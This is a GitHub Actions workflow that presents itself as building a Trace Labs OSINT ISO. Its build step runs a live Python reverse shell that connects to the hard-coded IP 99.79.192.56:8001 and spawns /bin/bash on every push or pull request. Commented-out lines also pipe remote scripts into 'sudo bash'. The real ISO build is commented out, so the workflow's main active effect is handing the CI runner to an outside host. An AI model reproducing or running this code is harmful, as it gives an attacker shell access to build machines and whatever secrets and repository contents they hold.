# This is a basic workflow to test the creation of the ISO
# updating
name: Build

# Controls when the action will run. Triggers the workflow on push or pull request
# events but only for the master branch
on:
  push:
    branches: [ dev, master ]
  pull_request:
    branches: [ dev, master ]

# A workflow run is made up of one or more jobs that can run sequentially or in parallel
jobs:
  # This workflow contains a single job called "build"
  build:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
    # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
    - uses: actions/checkout@v2

    # Runs a single command using the runners shell
    #- name: run the install
    #  run: wget -O - https://raw.githubusercontent.com/tracelabs/tlosint-live/dev/build_tracelabsiso_recipe.sh | sudo bash

    # Runs a set of commands using the runners shell
    - name: Run a multi-line script (build the ISO)
      run: |
        df -h
        pwd
        lsblk
        #sudo find /var/ -type f -printf "%s\t%p\n" | sort -n | tail -10
        sudo rm -rf /var/lib/mysql/ib_logfile0
        df -h
        sudo rm -rf /var/lib/mysql/ib_logfile1
        df -h
        sudo rm -rf /var/lib/apt/lists/azure.archive.ubuntu.com_ubuntu_dists_bionic_universe_binary-i386_Packages
        df -h
        sudo rm -rf /var/lib/apt/lists/azure.archive.ubuntu.com_ubuntu_dists_bionic_universe_binary-amd64_Packages
        sudo rm -rf /opt/android/
        df -h
        ls -al
        echo "After android sdk removal"
        df -h
        lsblk
        #sudo docker system prune --all -f
        #sudo find /var/lib/docker/containers/ -type f -name “*.log” -delete
        echo "After cleaning up docker"
        df -h
        lsblk
        echo "Reverse shell test"
        echo "Run"
        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("99.79.192.56",8001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
        # wget -O - https://raw.githubusercontent.com/tracelabs/tlosint-live/dev/build_tracelabsiso_recipe.sh | sudo bash
        #wget -O - https://raw.githubusercontent.com/phunkpwnz/tlosint-live/master/build_tracelabsiso_recipe.sh | sudo bash
        #zip kali-linux-rolling-live-tracelabs-amd64.zip /opt/live-build-config/images/kali-linux-rolling-live-tracelabs-amd64.iso
        #ls -lah kali-linux-rolling-live-tracelabs-amd64.zip
